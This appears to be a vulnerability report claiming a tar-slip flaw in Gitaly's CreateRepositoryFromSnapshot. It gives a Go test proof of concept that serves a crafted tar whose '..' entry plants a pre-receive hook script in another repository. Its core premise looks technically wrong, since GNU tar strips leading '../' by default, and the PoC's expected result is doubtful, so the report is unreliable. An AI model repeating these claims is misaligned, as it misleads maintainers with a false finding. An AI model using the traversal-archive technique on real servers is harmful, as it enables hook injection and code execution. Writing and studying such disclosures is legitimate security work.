### Title
Tar-slip path traversal in `CreateRepositoryFromSnapshot` allows cross-repository file/hook write - ([File: internal/gitaly/service/repository/create_repository_from_snapshot.go])

### Summary
`server.untar` pipes an attacker-controllable HTTP response body directly into `tar -C path -xvf -` with no validation of the archive's entry names. Because standard `tar` does not by default prevent `..`-relative path traversal within extracted member names, a crafted tar response can write files outside the freshly-created repository directory, including into a sibling repository's `hooks/` directory.

### Finding Description
In `CreateRepositoryFromSnapshot` [1](#0-0) , `s.untar` is invoked with the newly created repository's path and the raw request (`in`), which carries attacker-supplied `HttpUrl`/`ResolvedAddress`/`HttpAuth`. In `untar`, the HTTP response body is fetched and streamed straight into a `tar` subprocess with `-C path -xvf -` [2](#0-1) . No inspection or sanitization of the tar member names (e.g., rejecting `..` segments or absolute paths) is performed before or during extraction — the code simply trusts the archive content. The author of the code is explicitly aware of this risk, noting in a comment: "the received archive is trusted *a lot*. Before pointing this RPC at endpoints not under our control, it should undergo a lot of hardening" [3](#0-2) . Since `HttpUrl` is a caller-supplied RPC field, an attacker who can trigger this RPC (e.g. via project import/fork flows that surface this field to GitLab Rails) fully controls the HTTP server and thus the tar stream, and can include entries like `../../<other-repo>/hooks/pre-receive` to escape the target repo's directory and write into a different repository on shared storage, effectively planting a hook or corrupting arbitrary files reachable via relative traversal from the target path.

### Impact Explanation
This is a cross-repository/storage-path-escape write primitive: an attacker can write files outside the isolated repository directory that `s.locator.GetRepoPath` provisions, potentially planting executable hooks (e.g. `pre-receive`) in another repository on the same Gitaly storage, leading to remote code execution when that other repository is subsequently pushed to, or corrupting arbitrary files under the storage root reachable via `..` traversal. This matches GitLab bounty's "arbitrary file write" / "hook injection leading to RCE" / repository isolation bypass impact classes.

### Likelihood Explanation
Exploitability requires the attacker to be able to invoke `CreateRepositoryFromSnapshot` with a URL they control (e.g. via an import/fork/snapshot workflow that surfaces `HttpUrl` to the caller) and to fully control the HTTP server's response content — both realistic for an unprivileged user who can initiate a project import pointing at an attacker-controlled endpoint, or otherwise control the snapshot source. No admin privileges, secrets, or non-default configuration are required; the vulnerable code path is unconditional and unauthenticated with respect to tar-entry sanitization. The primary uncertainty is whether the GitLab Rails layer restricts which callers/flows can set `HttpUrl` to an attacker-chosen value — this repo (Gitaly) does not itself perform that restriction, so Gitaly's server-side handling remains fully exposed to a tar-slip attack.

### Recommendation
Do not extract the archive with a bare shell-out to `tar` trusting all entry names. Either (1) parse the tar stream in Go (e.g. via `archive/tar`) and reject/skip any entry whose cleaned path (via `filepath.Clean`/`storage.ValidateRelativePath`) is not contained within `path`, rejecting absolute paths and any entries containing `..` segments that escape the target directory, or (2) invoke system `tar` with a hardening flag set such as `--no-same-owner --one-top-level` combined with pre-scanning entries and rejecting unsafe names, and reject symlink/hardlink entries whose targets escape `path`. Additionally, consider gating this RPC's usage to trusted contexts and documenting/enforcing that `HttpUrl` sources are restricted server-side.

### Proof of Concept
```go
func TestCreateRepositoryFromSnapshot_pathTraversal(t *testing.T) {
	ctx := testhelper.Context(t)
	cfg, client := setupRepositoryService(t)

	// Build a malicious tar with a traversal entry.
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	payload := []byte("#!/bin/sh\necho pwned\n")
	require.NoError(t, tw.WriteHeader(&tar.Header{
		Name: "../../../other-repo.git/hooks/pre-receive",
		Mode: 0755,
		Size: int64(len(payload)),
	}))
	_, err := tw.Write(payload)
	require.NoError(t, err)
	require.NoError(t, tw.Close())

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.Copy(w, bytes.NewReader(buf.Bytes()))
	}))
	defer srv.Close()

	repo := &gitalypb.Repository{
		StorageName:  cfg.Storages[0].Name,
		RelativePath: gittest.NewRepositoryName(t),
	}

	_, err = client.CreateRepositoryFromSnapshot(ctx, &gitalypb.CreateRepositoryFromSnapshotRequest{
		Repository: repo,
		HttpUrl:    srv.URL,
	})
	require.NoError(t, err)

	// Assert the hook file landed outside the created repository path.
	escapedPath := filepath.Join(cfg.Storages[0].Path, "other-repo.git", "hooks", "pre-receive")
	_, statErr := os.Stat(escapedPath)
	require.NoError(t, statErr, "expected traversal file to exist outside repo path")
}
```
Expected (buggy) result: the `pre-receive` file is created outside the newly-provisioned repository directory, demonstrating the storage-path escape.

### Citations

**File:** internal/gitaly/service/repository/create_repository_from_snapshot.go (L105-120)
```go
	rsp, err := client.Do(req)
	if err != nil {
		return structerr.NewInternal("HTTP request failed: %w", err)
	}
	defer rsp.Body.Close()

	if rsp.StatusCode < http.StatusOK || rsp.StatusCode >= http.StatusMultipleChoices {
		return structerr.NewInternal("HTTP server: %s", rsp.Status)
	}

	cmd, err := command.New(ctx, s.logger, []string{"tar", "-C", path, "-xvf", "-"}, command.WithStdin(rsp.Body))
	if err != nil {
		return err
	}

	return cmd.Wait()
```

**File:** internal/gitaly/service/repository/create_repository_from_snapshot.go (L123-149)
```go
func (s *server) CreateRepositoryFromSnapshot(ctx context.Context, in *gitalypb.CreateRepositoryFromSnapshotRequest) (*gitalypb.CreateRepositoryFromSnapshotResponse, error) {
	repository := in.GetRepository()
	if err := s.locator.ValidateRepository(ctx, repository, storage.WithSkipRepositoryExistenceCheck()); err != nil {
		return nil, structerr.NewInvalidArgument("%w", err)
	}

	if err := repoutil.Create(ctx, s.logger, s.locator, s.gitCmdFactory, s.catfileCache, s.txManager, s.repositoryCounter, repository, func(repo *gitalypb.Repository) error {
		path, err := s.locator.GetRepoPath(ctx, repo, storage.WithRepositoryVerificationSkipped())
		if err != nil {
			return structerr.NewInternal("getting repo path: %w", err)
		}

		// The archive contains a partial git repository, missing a config file and
		// other important items. Initializing a new bare one and extracting the
		// archive on top of it ensures the created git repository has everything
		// it needs (especially, the config file and hooks directory).
		//
		// NOTE: The received archive is trusted *a lot*. Before pointing this RPC
		// at endpoints not under our control, it should undergo a lot of hardening.
		if err := s.untar(ctx, path, in); err != nil {
			return structerr.NewInternal("extracting snapshot: %w", err)
		}

		return nil
	}); err != nil {
		return nil, structerr.NewInternal("creating repository: %w", err)
	}
```
